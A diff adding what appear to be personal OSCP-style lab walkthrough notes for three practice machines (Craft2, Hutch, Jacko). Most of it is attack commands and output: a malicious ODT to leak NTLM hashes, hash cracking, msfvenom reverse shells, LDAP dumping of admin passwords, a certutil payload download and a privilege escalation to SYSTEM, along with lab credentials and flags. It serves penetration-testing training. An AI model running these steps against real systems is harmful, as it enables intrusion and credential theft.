@@ -496,14 +496,139 @@ bcd86c0525b8853e6939e81b8858856f
 
 ## Craft2
 
+1. Rustscan and nmap 
+```
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack
+135/tcp   open  msrpc        syn-ack
+445/tcp   open  microsoft-ds syn-ack
+49666/tcp open  unknown      syn-ack
 
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+|_http-title: Craft
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+49666/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-03-23T09:38:37
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+```
+
+2. Can upload odt file. Use exploit to create malicious odt file. https://github.com/rmdavy/badodf/blob/master/badodt.py
+```
+python3 badodt.py
+
+    ____            __      ____  ____  ______
+   / __ )____ _____/ /     / __ \/ __ \/ ____/
+  / __  / __ `/ __  /_____/ / / / / / / /_    
+ / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
+/_____/\__,_/\__,_/      \____/_____/_/     
+
+
+Create a malicious ODF document help leak NetNTLM Creds
+
+By Richard Davy 
+@rd_pentest
+Python3 version by @gustanini
+www.secureyourit.co.uk
+
+
+Please enter IP of listener: 192.168.45.153
+/home/kali/OSCP/pg/bad.odt successfully created
+```
+
+3. Upload file and capture ntlm hash using responder. 
+```
+sudo responder -I tun0 -v 
+
+SMB] NTLMv2-SSP Client   : 192.168.223.188
+[SMB] NTLMv2-SSP Username : CRAFT2\thecybergeek
+[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:ed658a329ebae08f:8092E4AB4A10B3CB73718B670199A3A3:0101000000000000005CBFC9E47CDA0163B1363FF7116978000000000200080050004E003600450001001E00570049004E002D0032004C004300340057004D0052004B0059003500420004003400570049004E002D0032004C004300340057004D0052004B005900350042002E0050004E00360045002E004C004F00430041004C000300140050004E00360045002E004C004F00430041004C000500140050004E00360045002E004C004F00430041004C0007000800005CBFC9E47CDA01060004000200000008003000300000000000000000000000003000009DAD080303EA6CE68AAFBA3B7D64375D24E9232BF6346082091ABD647F55EC070A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100350033000000000000000000  
+
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt craft2hash
+winniethepooh    (thecybergeek) 
+```
+
+4. Foothold. Upload msfvenom reverse shell. Obtained local.txt
+```
+msfvenom -p php/reverse_php LHOST=192.168.45.153 LPORT=4449 -o s.php
+
+http://192.168.223.188/s.php
+
+nc -lvnp 4449
+listening on [any] 4449 ...
+connect to [192.168.45.153] from (UNKNOWN) [192.168.223.188] 49797
+
+whoami
+craft2\apache
+PS C:\xampp\htdocs> 
+```
 
 ## Heist
 
 
 
 ## Hutch
+1. Rustscan
+```
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+49666/tcp open  unknown          syn-ack
+49668/tcp open  unknown          syn-ack
+49673/tcp open  unknown          syn-ack
+49674/tcp open  unknown          syn-ack
+49676/tcp open  unknown          syn-ack
+49692/tcp open  unknown          syn-ack
+49815/tcp open  unknown          syn-ack
+```
 
+2. Ldap port open so, started working on it. Dump user passwords. 
+```
+ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.245.122" "(objectclass=*)"
+
+description: Password set to CrabSharkJellyfish192 at user's request. Please c
+
+sAMAccountName: fmcsorley
+```
+
+3. Dump admin password. 
+```
+ldapsearch -x -H 'ldap://192.168.245.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
+
+ms-Mcs-AdmPwd: 8!.@hJ$3K/9Y26
+```
+
+4. Impacket login. Obtained local.txt and root.txt
+```
+impacket-psexec hutch.offsec/administrator:'8!.@hJ$3K/9Y26'@192.168.245.122
+
+C:\Users\fmcsorley\Desktop> type local.txt
+e421093202bde328492627830ef15f90
+
+C:\Users\Administrator\Desktop> type proof.txt
+486de9e68f17ec8a3a393103d2ff3c4e
+```
 
 
 ## Internal
@@ -669,7 +794,95 @@ type proof.txt
 
 
 ## Jacko
+1. Nmap and Rustscan
+```
+PORT      STATE SERVICE         REASON
+80/tcp    open  http            syn-ack
+135/tcp   open  msrpc           syn-ack
+139/tcp   open  netbios-ssn     syn-ack
+445/tcp   open  microsoft-ds    syn-ack
+5040/tcp  open  unknown         syn-ack
+7680/tcp  open  pando-pub       syn-ack
+8082/tcp  open  blackice-alerts syn-ack
+9092/tcp  open  XmlIpcRegSvc    syn-ack
+49664/tcp open  unknown         syn-ack
+49665/tcp open  unknown         syn-ack
+49666/tcp open  unknown         syn-ack
+49667/tcp open  unknown         syn-ack
+49668/tcp open  unknown         syn-ack
+49669/tcp open  unknown         syn-ack
 
+PORT      STATE  SERVICE       VERSION
+80/tcp    open   http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: H2 Database Engine (redirect)
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open   microsoft-ds?
+5040/tcp  open   unknown
+7680/tcp  closed pando-pub
+8082/tcp  open   http          H2 database http console
+|_http-title: H2 Console
+9092/tcp  open   XmlIpcRegSvc?
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49668/tcp open   msrpc         Microsoft Windows RPC
+49669/tcp open   msrpc         Microsoft Windows RPC
+```
+
+2. Found a page at 8082 which has exploit. 
+```
+http://192.168.223.66:8082/login.jsp?jsessionid=4643e845bbc10a2515a7cd02b0d3dc13
+
+https://www.exploit-db.com/exploits/49384?source=post_page-----5233e3d6f5e--------------------------------
+
+Run all script line one by one and run it. Obtained foothold after uploading msfvenom reverse.exe file in temp folder and running it. 
+```
+
+3. Foothold
+```
+nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.153] from (UNKNOWN) [192.168.223.66] 49739
+Microsoft Windows [Version 10.0.18363.836]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\H2\service>
+```
+
+4. Make it more interactive command
+```
+C:\Program Files (x86)>set PATH=%SystemRoot%\system32;%SystemRoot%;
+```
+
+5. Upload msfvenom dll file and also exploit. 
+```
+certutil -urlcache -f http://192.168.45.153/exploit.dll C:/Windows/Temp/UninOldIS.dll
+
+https://www.exploit-db.com/exploits/49382
+```
+
+6. Obtained another reverse shell as root. 
+```
+C:\Windows\Temp>C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\49382.ps1
+C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\49382.ps1
+Writable location found, copying payload to C:\JavaTemp\
+Payload copied, triggering...
+
+sudo nc -nvlp 2222                         
+listening on [any] 2222 ...
+connect to [192.168.45.153] from (UNKNOWN) [192.168.223.66] 49785
+Microsoft Windows [Version 10.0.18363.836]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
 
 
 ## Kevin
